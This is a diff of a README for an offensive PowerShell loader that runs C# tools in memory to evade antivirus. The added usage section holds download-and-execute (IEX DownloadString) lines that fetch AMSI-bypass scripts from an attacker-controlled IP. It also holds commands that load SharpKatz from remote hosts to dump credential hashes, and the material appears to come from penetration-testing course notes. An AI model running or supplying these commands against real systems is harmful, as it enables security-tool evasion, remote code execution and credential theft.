@@ -1,10 +1,27 @@
 # PowerShell exec-assembly remote loader
 
-## This is used to load sharp assembly tools remotely from PowerShell direcly in memory (fileless) for a better AV bypass (need AMSI bypass first)
+## There is a very useful tool to wrap CSharp assemlby tools within PowerShell can be loaded remotely:
 
-Usage:
+`https://github.com/S3cur3Th1sSh1t/PowerSharpPack`
+
+## However, sometimes I will need to load some uncommon CSharp tools, this one is used to load CSharp assembly EXE directly in memory (fileless). it will provide a better AV bypass (need AMSI bypass first)
+
+## Regarding to AMSI bypass, must read this first:
+`https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/` 
+
+### Usage:
 
 ```
+## AMSI bypass all-in-one, sometimes amsi3.txt been detected and blocked
+IEX([Net.Webclient]::new().DownloadString("http://10.0.0.189/osep/amsi3.txt"));
+IEX([Net.Webclient]::new().DownloadString("http://10.0.0.189/osep/Invoke-LoadAssembly.ps1"));
+
+## If amsi3.txt has been blocked, then try the following AMSI bypass 
+IEX([Net.Webclient]::new().DownloadString("http://10.0.0.189/osep/amsi.txt"));
+IEX([Net.Webclient]::new().DownloadString("http://10.0.0.189/osep/amsi2.txt"));
+IEX([Net.Webclient]::new().DownloadString("http://10.0.0.189/osep/Invoke-LoadAssembly.ps1"));
+
+
 ## Load SharpKatz
 Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/SharpKatz.exe -Command "msv"
 Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpKatz.exe?raw=true -Command "msv"
